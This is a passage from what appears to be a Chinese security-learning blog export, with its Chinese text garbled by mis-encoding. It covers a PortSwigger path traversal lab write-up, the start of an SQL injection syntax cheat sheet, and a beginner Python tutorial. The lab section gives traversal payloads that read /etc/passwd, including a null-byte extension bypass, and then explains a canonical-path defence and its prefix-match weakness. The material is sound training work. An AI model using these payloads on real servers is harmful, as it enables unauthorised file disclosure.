        <p>å½“ç„¶æœ‰å¯èƒ½ã€‚è¿™å–å†³äºæœåŠ¡å™¨çš„é…ç½®å’Œä»£ç å®ç°ã€‚å¦‚æœæœåŠ¡å™¨åªè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œé‚£ä¹ˆæ”»å‡»è€…éœ€è¦ç›´æ¥ä½¿ç”¨å•æ¬¡ç¼–ç çš„å­—ç¬¦ï¼Œä¾‹å¦‚<code>%2e%2f%2e%2e</code>ç­‰ã€‚è€Œå¦‚æœæœåŠ¡å™¨è§£ç æ¬¡æ•°è¶…è¿‡ä¸¤æ¬¡ï¼Œæ¯”å¦‚ä¸‰æ¬¡ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½éœ€è¦ä½¿ç”¨ä¸‰é‡ç¼–ç ï¼Œæ¯”å¦‚<code>%2525252e</code>ï¼ˆå‡è®¾ä¸‰é‡ç¼–ç çš„è¯ï¼‰ã€‚ä¸è¿‡è¿™ç§æƒ…å†µæ¯”è¾ƒå°‘è§ï¼Œå› ä¸ºé€šå¸¸æœåŠ¡å™¨ä¸ä¼šå¤šæ¬¡è§£ç ã€‚</p>

    </div>
</div>
<h3 id="Lab-File-path-traversal-validation-of-start-of-path">Lab: File path traversal, validation of start of path</h3>
<p>åº”ç”¨ç¨‹åºå¯èƒ½è¦æ±‚ç”¨æˆ·æä¾›çš„æ–‡ä»¶åä»¥é¢„æœŸçš„åŸºæœ¬æ–‡ä»¶å¤¹å¼€å§‹ï¼Œå¦‚ <code>/var/www/images</code>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨æ‰€éœ€çš„åŸºæœ¬æ–‡ä»¶å¤¹ååŠ ä¸Šé€‚å½“çš„éå†åºåˆ—ã€‚ä¾‹å¦‚ï¼š<code>filename=/var/www/images/.../.../.../etc/passwd</code></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æˆ‘ç”¨äº†urlç¼–ç ï¼Œä¸ä½¿ç”¨urlç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå•å±‚è§£ç ï¼ŒåŒå±‚å°±ä¸è¡Œäº†</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430171637924.png" alt="image-20250430171637924"></p>
<h3 id="Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass">Lab: File path traversal, validation of file extension with null byte bypass</h3>
<p>åº”ç”¨ç¨‹åºå¯èƒ½è¦æ±‚ç”¨æˆ·æä¾›çš„æ–‡ä»¶åä»¥é¢„æœŸçš„æ–‡ä»¶æ‰©å±•åç»“å°¾ï¼Œå¦‚ .pngã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ç©ºå­—èŠ‚åœ¨æ‰€éœ€æ‰©å±•åä¹‹å‰æœ‰æ•ˆåœ°ç»ˆæ­¢æ–‡ä»¶è·¯å¾„ã€‚ä¾‹å¦‚ï¼šfilename=â€¦/â€¦/â€¦/etc/passwd%00.pngã€‚</p>
<p>æœ¬å®éªŒå®¤åœ¨æ˜¾ç¤ºäº§å“å›¾åƒæ—¶å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚åº”ç”¨ç¨‹åºä¼šéªŒè¯æ‰€æä¾›çš„æ–‡ä»¶åæ˜¯å¦ä»¥é¢„æœŸçš„æ–‡ä»¶æ‰©å±•åç»“å°¾ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·æ£€ç´¢ /etc/passwd æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>è¿™ä¸ªæ„Ÿè§‰å¥½ç‰›å•Šï¼Œå¸Œæœ›è‡ªå·±æ…¢æ…¢ç§¯ç´¯ï¼Œç§¯è·¬æ­¥è‡³åƒé‡Œå§ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç›¸å¯¹è·¯å¾„ååŠ <code>%00.png</code>ç»•è¿‡æ–‡ä»¶åç¼€éªŒè¯</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430172259167.png" alt="image-20250430172259167"></p>
<h2 id="å¦‚ä½•é˜²æ­¢è·¯å¾„éå†æ”»å‡»">å¦‚ä½•é˜²æ­¢è·¯å¾„éå†æ”»å‡»</h2>
<p>é˜²æ­¢è·¯å¾„éå†æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯å®Œå…¨é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ APIã€‚è®¸å¤šè¿™æ ·åšçš„åº”ç”¨ç¨‹åºå‡½æ•°éƒ½å¯ä»¥é‡å†™ï¼Œä»¥æ›´å®‰å…¨çš„æ–¹å¼æä¾›ç›¸åŒçš„è¡Œä¸ºã€‚</p>
<p>å¦‚æœæ— æ³•é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™æ–‡ä»¶ç³»ç»Ÿ APIï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ä¸¤å±‚é˜²å¾¡æ¥é˜²æ­¢æ”»å‡»ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥ä¹‹å‰å¯¹å…¶è¿›è¡ŒéªŒè¯ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·è¾“å…¥ä¸å…è®¸å€¼ç™½åå•è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœåšä¸åˆ°è¿™ä¸€ç‚¹ï¼Œåˆ™è¦éªŒè¯è¾“å…¥æ˜¯å¦åªåŒ…å«å…è®¸çš„å†…å®¹ï¼Œä¾‹å¦‚åªåŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>éªŒè¯æ‰€æä¾›çš„è¾“å…¥åï¼Œå°†è¾“å…¥è¿½åŠ åˆ°åŸºæœ¬ç›®å½•ï¼Œå¹¶ä½¿ç”¨å¹³å°æ–‡ä»¶ç³»ç»Ÿ API å¯¹è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–ã€‚éªŒè¯è§„èŒƒåŒ–è·¯å¾„æ˜¯å¦ä»¥é¢„æœŸçš„åŸºæœ¬ç›®å½•å¼€å§‹ã€‚</p>
</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ ¹æ®ç”¨æˆ·è¾“å…¥éªŒè¯æ–‡ä»¶è§„èŒƒè·¯å¾„çš„ç®€å• Java ä»£ç ç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ä»£ç é€è¡Œè§£æï¼š</strong></p>
<ol>
<li class="lvl-3">
<p>åˆ›å»ºæ–‡ä»¶å¯¹è±¡</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(BASE_DIRECTORY, userInput);</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>File</code>ç±»</strong>ï¼šJavaä¸­ç”¨äºè¡¨ç¤ºæ–‡ä»¶æˆ–ç›®å½•è·¯å¾„çš„ç±»ã€‚</p>
</li>
<li class="lvl-2">
<p><strong>æ„é€ å‡½æ•°å‚æ•°</strong>ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4"><code>BASE_DIRECTORY</code>ï¼šé¢„å®šä¹‰çš„åŸºç¡€ç›®å½•ï¼ˆå¦‚<code>/safe/path</code>ï¼‰ï¼Œç”¨äºé™åˆ¶æ–‡ä»¶è®¿é—®èŒƒå›´ã€‚</li>
<li class="lvl-4"><code>userInput</code>ï¼šç”¨æˆ·è¾“å…¥çš„è·¯å¾„ï¼ˆå¦‚<code>data.txt</code>æˆ–<code>../../secret.txt</code>ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>ä½œç”¨</strong>ï¼šå°†ä¸¤è€…æ‹¼æ¥æˆå®Œæ•´è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4">è‹¥<code>BASE_DIRECTORY</code>æ˜¯<code>/safe</code>ï¼Œ<code>userInput</code>æ˜¯<code>file.txt</code>ï¼Œåˆ™æ‹¼æ¥ä¸º<code>/safe/file.txt</code>ã€‚</li>
<li class="lvl-4">è‹¥<code>userInput</code>æ˜¯<code>../etc/passwd</code>ï¼Œåˆ™æ‹¼æ¥ä¸º<code>/safe/../etc/passwd</code>ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>è·¯å¾„è§„èŒƒåŒ–éªŒè¯</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) &#123;</span><br><span class="line">    <span class="comment">// å¤„ç†æ–‡ä»¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>getCanonicalPath()</code></strong>ï¼šå°†è·¯å¾„è½¬æ¢ä¸º<strong>ç»å¯¹ä¸”å”¯ä¸€</strong>çš„è§„èŒƒå½¢å¼ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4">è§£æ<code>.</code>ï¼ˆå½“å‰ç›®å½•ï¼‰å’Œ<code>..</code>ï¼ˆä¸Šçº§ç›®å½•ï¼‰ã€‚</li>
<li class="lvl-4">å»é™¤å¤šä½™çš„æ–œæ ï¼ˆå¦‚<code>/safe//file</code>å˜ä¸º<code>/safe/file</code>ï¼‰ã€‚</li>
<li class="lvl-4">è§£æç¬¦å·é“¾æ¥ï¼ˆå¦‚å°†å¿«æ·æ–¹å¼è½¬ä¸ºçœŸå®è·¯å¾„ï¼‰ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š<code>/safe/../etc/passwd</code> ä¼šè¢«è§„èŒƒåŒ–ä¸º <code>/etc/passwd</code>ã€‚</p>
</li>
<li class="lvl-2">
<p><strong><code>startsWith(BASE_DIRECTORY)</code></strong>ï¼šæ£€æŸ¥è§„èŒƒè·¯å¾„æ˜¯å¦ä»¥<code>BASE_DIRECTORY</code>å¼€å¤´ã€‚</p>
<ul class="lvl-2">
<li class="lvl-4">è‹¥ç”¨æˆ·è¾“å…¥åˆæ³•ï¼ˆå¦‚<code>data.txt</code>ï¼‰ï¼Œè§„èŒƒè·¯å¾„ä¸º<code>/safe/data.txt</code>ï¼ŒéªŒè¯é€šè¿‡ã€‚</li>
<li class="lvl-4">è‹¥ç”¨æˆ·è¾“å…¥éæ³•ï¼ˆå¦‚<code>../../etc/passwd</code>ï¼‰ï¼Œè§„èŒƒè·¯å¾„ä¸º<code>/etc/passwd</code>ï¼ŒéªŒè¯å¤±è´¥ã€‚</li>
</ul>
</li>
</ul>
<p>ä½†æ˜¯è¿™æ®µä»£ç åº”è¯¥æœ‰ä¸€å®šçš„é—®é¢˜ï¼Œå°±æ˜¯åªè¦ä¿è¯æ–‡ä»¶è·¯å¾„ä¸<code>BASE_DIRECTORY</code>ä¸€è‡´å³å¯ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœ<code>BASE_DIRECTORY</code>æ˜¯<code>/base</code>ä¾¿å¯ä»¥æ„é€ <code>/baseXXXX</code>è¶Šæƒè®¿é—®ä¸æ–‡ä»¶å¼€å¤´ä¸<code>BASE_DIRECTORY</code>ä¸€è‡´çš„åŒçº§ç›®å½•ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://portswigger.net/web-security/file-path-traversal">Path traversal</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>PortSwiggeré¶åœº</tag>
        <tag>è·¯å¾„éå†</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€SQLæ³¨å…¥ã€‘è¯­æ³•ç¤ºä¾‹</title>
    <url>/posts/180be885/</url>
    <content><![CDATA[<p>æœ¬ SQL æ³¨å…¥å°æŠ„åŒ…å«æœ‰ç”¨è¯­æ³•çš„ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›è¯­æ³•æ‰§è¡Œå„ç§ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡åœ¨æ‰§è¡Œ SQL æ³¨å…¥æ”»å‡»æ—¶ç»å¸¸ä¼šå‡ºç°ã€‚</p>
<h2 id="String-concatenation">String concatenation</h2>
<p>åªæœ‰ä¸€ä¸ªåˆ—æ—¶å¯ä»¥å°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<table>
<thead>
<tr>
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td>Oracle</td>
<td>â€˜fooâ€™||â€˜barâ€™</td>
</tr>
<tr>
<td>Microsoft</td>
<td><code>'foo'+'bar'</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>â€˜fooâ€™||â€˜barâ€™</td>
</tr>
<tr>
<td>MySQL</td>
<td><code>'foo' 'bar'</code> <br><code>CONCAT('foo','bar')</code></td>
</tr>
</tbody>
</table>
<h2 id="Substring">Substring</h2>
<p>æ‚¨å¯ä»¥ä»æŒ‡å®šé•¿åº¦çš„æŒ‡å®šåç§»é‡ä¸­æå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚è¯·æ³¨æ„ï¼Œåç§»ç´¢å¼•æ˜¯ä»¥ 1 ä¸ºå•ä½çš„ã€‚ä»¥ä¸‹æ¯ä¸ªè¡¨è¾¾å¼éƒ½å°†è¿”å›å­—ç¬¦ä¸² baã€‚</p>
<table>
<thead>
<tr>
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td>Oracle</td>
<td><code>SUBSTR('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>Microsoft</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>MySQL</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
</tbody>
</table>
<h2 id="Comments">Comments</h2>
<p>å¯ä»¥ä½¿ç”¨æ³¨é‡Šæ¥æˆªæ–­æŸ¥è¯¢ï¼ˆä¹Ÿå¯ä»¥ç”¨åˆ«çš„ï¼‰ï¼Œå¹¶åˆ é™¤åŸå§‹æŸ¥è¯¢ä¸­è·Ÿéšæ‚¨è¾“å…¥çš„éƒ¨åˆ†ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Pythonã€‘PythonåŸºç¡€</title>
    <url>/posts/731b144e/</url>
    <content><![CDATA[<h2 id="Pythonæ¦‚è¿°">Pythonæ¦‚è¿°</h2>
<h2 id="pycharmå¸¸ç”¨å¿«æ·é”®ï¼š">pycharmå¸¸ç”¨å¿«æ·é”®ï¼š</h2>
<table>
<thead>
<tr>
<th>ä½œç”¨</th>
<th>å¿«æ·é”®</th>
<th>ä½œç”¨</th>
<th>å¿«æ·é”®</th>
</tr>
</thead>
<tbody>
<tr>
<td>å•è¡Œæ³¨é‡Š</td>
<td>Ctrl + /</td>
<td>å¤åˆ¶å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œ</td>
<td>Ctrl + D</td>
</tr>
<tr>
<td>æ ¼å¼åŒ–ä»£ç </td>
<td>Ctrl + Alt + L</td>
<td>åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œ</td>
<td>Ctrl + X</td>
</tr>
<tr>
<td>å…¨å±€æŸ¥æ‰¾</td>
<td>Ctrl + Shift + R</td>
<td>è¿”å›è‡³ä¸Šæ¬¡æµè§ˆçš„ä½ç½®</td>
<td>Ctrl + Alt + left/right</td>
</tr>
<tr>
<td>å¿«é€Ÿé€‰ä¸­ä»£ç </td>
<td>Ctrl + W</td>
<td>æ›¿æ¢</td>
<td>Ctrl + R</td>
</tr>
</tbody>
</table>
<h2 id="æ ‡è¯†ç¬¦ä¸å…³é”®å­—ï¼š">æ ‡è¯†ç¬¦ä¸å…³é”®å­—ï¼š</h2>
<h3 id="æ ‡è¯†ç¬¦">æ ‡è¯†ç¬¦</h3>
<p>æ ‡è¯†ç¬¦å°±æ˜¯ä¸€ä¸ªåå­—ï¼Œå°±å¥½åƒæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„åå­—ï¼›ä¸»è¦ä½œç”¨æ˜¯ä½œä¸ºç¨‹åºä¸­å˜é‡ã€å‡½æ•°ã€ç±»ã€æ¨¡å—ä»¥åŠå…¶ä»–å¯¹è±¡çš„è°ƒç”¨åç§°ã€‚</p>
<p>Pythonä¸­æ ‡è¯†ç¬¦çš„å‘½åè¦éµå®ˆä¸€å®šçš„å‘½åè§„åˆ™ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æ ‡è¯†ç¬¦ç”±å­—æ¯ã€ä¸‹åˆ’çº¿å’Œæ•°å­—ç»„æˆï¼Œä½†ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚</p>
</li>
<li class="lvl-2">
<p>æ ‡è¯†ç¬¦ä¸èƒ½å’Œ Pythonä¸­å…³é”®å­—ç­‰ç›¸åŒã€‚</p>
</li>
<li class="lvl-2">
<p>æ ‡è¯†ç¬¦ä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼Œä¾‹ï¼šCorazonå’Œcorazonæ˜¯ä¸åŒæ ‡è¯†ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>ä»¥ä¸‹åˆ’çº¿å¼€å¤´æ ‡è¯†ç¬¦å¾€å¾€æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p>
</li>
</ul>
<h3 id="å…³é”®å­—">å…³é”®å­—</h3>
<p>å…³é”®å­—å°±æ˜¯Pytnonå†…éƒ¨å·²ç»å®šä¹‰å¥½çš„å…·æœ‰ç‰¹æ®Šæ„ä¹‰çš„æ ‡è¯†ç¬¦ï¼Œå¼€å‘äººå‘˜ä¸èƒ½é‡å¤å®šä¹‰ã€‚</p>
<p>Python3çš„å…³é”®å­—å¯ä»¥é€šè¿‡keywordæ¨¡å—çš„å˜é‡kwlistæŸ¥çœ‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰“å°å…³é”®å­—åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br><span class="line"><span class="comment"># å…³é”®å­—è¾“å‡ºç»“æœ</span></span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;__peg_parser__&#x27;</span>,<span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å…³é”®å­—å¸®åŠ©</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(<span class="string">&quot;if&quot;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="å®šä¹‰å˜é‡">å®šä¹‰å˜é‡</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">å˜é‡å = æ•°æ®</span><br></pre></td></tr></table></figure>
<p>ç­‰å·è¡¨ç¤ºèµ‹å€¼è¿ç®—ç¬¦ï¼Œä¸¤ç«¯æœ‰ç©ºæ ¼æ˜¯å¼€å‘è§„èŒƒï¼Œå¯ä»¥æ²¡æœ‰ã€‚</p>
<p>å®šä¹‰å˜é‡ç¤ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name  =  <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line">is_man = <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°å•ä¸ªå˜é‡å€¼ï¼Œprint()æ˜¯ä¸€ä¸ªè¾“å‡ºå‡½æ•°ï¼Œç±»ä¼¼Linuxé‡Œecho</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(age)</span><br><span class="line"><span class="comment"># æ‰“å°å¤šä¸ªå˜é‡å€¼,å¤šä¸ªå˜é‡ç”¨é€—å·éš”å¼€</span></span><br><span class="line"><span class="built_in">print</span>(name, age, is_man)</span><br></pre></td></tr></table></figure>
<h3 id="æ³¨é‡Š">æ³¨é‡Š</h3>
<p>æ³¨é‡Šæ˜¯ç¼–å†™ç¨‹åºæ—¶ï¼Œç¨‹åºå‘˜å¯¹ä¸€ä¸ªè¯­å¥ã€ç¨‹åºæ®µã€å‡½æ•°ç­‰çš„è§£é‡Šæˆ–æç¤ºï¼Œå¯æé«˜ç¨‹åºä»£ç å¯è¯»æ€§ï¼›</p>
<p>åˆç†çš„ä»£ç æ³¨é‡Šåº”è¯¥å æºä»£ç çš„1/4å·¦å³ï¼Œæ³¨é‡Šå†…å®¹ä¸ä¼šè¢«è§£é‡Šå™¨æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å•è¡Œæ³¨é‡Šä¿¡æ¯ï¼šä»¥#å·å¼€å¤´ï¼Œåé¢ç•™ä¸€ä¸ªç©ºæ ¼</span></span><br><span class="line"><span class="comment"># è¿™é‡Œå°±æ˜¯å•è¡Œæ³¨é‡Šï¼Œä»¥#å¼€å¤´,åé¢æ•´è¡Œéƒ½ä¸ä¼šè¢«è§£é‡Šå™¨æ‰§è¡Œ</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am Corazon teacher.&quot;</span>)  <span class="comment"># è¡¨ç¤ºæ‰“å°è¾“å‡º</span></span><br><span class="line">-- åœ¨ç¨‹åºå°¾éƒ¨æ³¨é‡Šï¼Œâ€œ<span class="comment">#â€å‰è‡³å°‘æœ‰ä¸¤ä¸ªç©ºæ ¼</span></span><br><span class="line"><span class="comment"># å¤šè¡Œæ³¨é‡Šä¿¡æ¯ï¼šåŒ…å«åœ¨3ä¸ªåŒå¼•å·æˆ–è€…3ä¸ªå•å¼•å·å†…çš„è¯­å¥</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">è¿™é‡Œå°±æ˜¯å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="string">ä¸‰ä¸ªå¼•å·é‡Œé¢çš„ä»»ä½•å†…å®¹ä¸ä¼šè¢«è§£é‡Šå™¨æ‰§è¡Œ</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¿™é‡Œå°±æ˜¯å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="string">ä¸‰ä¸ªå¼•å·é‡Œé¢çš„ä»»ä½•å†…å®¹ä¸ä¼šè¢«è§£é‡Šå™¨æ‰§è¡Œ</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="pythonä»£ç ç¼–å†™è¯­æ³•è§„èŒƒ">pythonä»£ç ç¼–å†™è¯­æ³•è§„èŒƒ</h2>
<h3 id="ä»£ç è¯­å¥åˆ†éš”ç¬¦å·">ä»£ç è¯­å¥åˆ†éš”ç¬¦å·</h3>
<p>Pythonä½¿ç”¨åˆ†å·ï¼Œç”¨äºä¸€æ¡è¯­å¥çš„ç»“æŸæ ‡è¯†ï¼Œå¦‚æœæ˜¯ä¸€è¡Œç»“å°¾ï¼Œå¯ç”¨æ¢è¡Œæ¥æ›¿ä»£åˆ†å·ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Pythonä½¿ç”¨åˆ†å·ï¼Œç”¨äºä¸€æ¡è¯­å¥çš„ç»“æŸæ ‡è¯†ï¼Œå¦‚æœæ˜¯ä¸€è¡Œç»“å°¾ï¼Œå¯ç”¨æ¢è¡Œæ¥æ›¿ä»£åˆ†å·ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨åˆ†å·ä½œä¸ºè¯­å¥åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am&quot;</span>);<span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ¢è¡Œä½œä¸ºè¯­å¥åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ä»£ç è¯­å¥ç¼©è¿›è¦æ±‚">ä»£ç è¯­å¥ç¼©è¿›è¦æ±‚</h3>
<p>Javaã€C è¯­è¨€é‡‡ç”¨å¤§æ‹¬å·â€œ{}â€åˆ†éš”ä»£ç å—ï¼Œè€ŒPython é‡‡ç”¨å†’å·â€œ:â€å’Œâ€œä»£ç ç¼©è¿›â€å’Œæ¥åŒºåˆ†ä»£ç å—ä¹‹é—´çš„å±‚æ¬¡;å¯¹äºç±»ã€å‡½æ•°ã€æµç¨‹æ§åˆ¶è¯­å¥ã€å¼‚å¸¸å¤„ç†è¯­å¥ç­‰ï¼Œè¡Œå°¾çš„å†’å·å’Œä¸‹ä¸€è¡Œçš„ç¼©è¿›ï¼Œè¡¨ç¤ºä¸‹ä¸€ä¸ªä»£ç å—çš„å¼€å§‹;è€Œç¼©è¿›çš„ç»“æŸåˆ™è¡¨ç¤ºæ­¤ä»£ç å—çš„ç»“æŸã€‚</p>
<p>Python ä¸­å¯ä½¿ç”¨ç©ºæ ¼æˆ–è€…Tabé”®å®ç°ï¼Œä½†æ— è®ºæ˜¯æ‰‹åŠ¨æ•²ç©ºæ ¼ï¼Œè¿˜æ˜¯ä½¿ç”¨ Tab é”®ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯é‡‡ç”¨ 4 ä¸ªç©ºæ ¼é•¿åº¦ä½œä¸ºä¸€ä¸ªç¼©è¿›é‡;</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ª Tab é”®å°±æ˜¯4 ä¸ªç©ºæ ¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·ä½ è¾“å…¥ä¸€ä¸ªæ•°å­—: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä½ è¾“å…¥çš„æ•°å­—æ˜¯&quot;</span>, i, <span class="string">&quot;ï¼Œå¤§äº5ï¼Œ&quot;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä½ è¾“å…¥çš„æ•°å­—æ˜¯&quot;</span>, i, <span class="string">&quot;ï¼Œå°äº5ï¼Œ&quot;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ä»£ç è¯­æ³•è§„èŒƒè¡¥å……">ä»£ç è¯­æ³•è§„èŒƒè¡¥å……</h3>
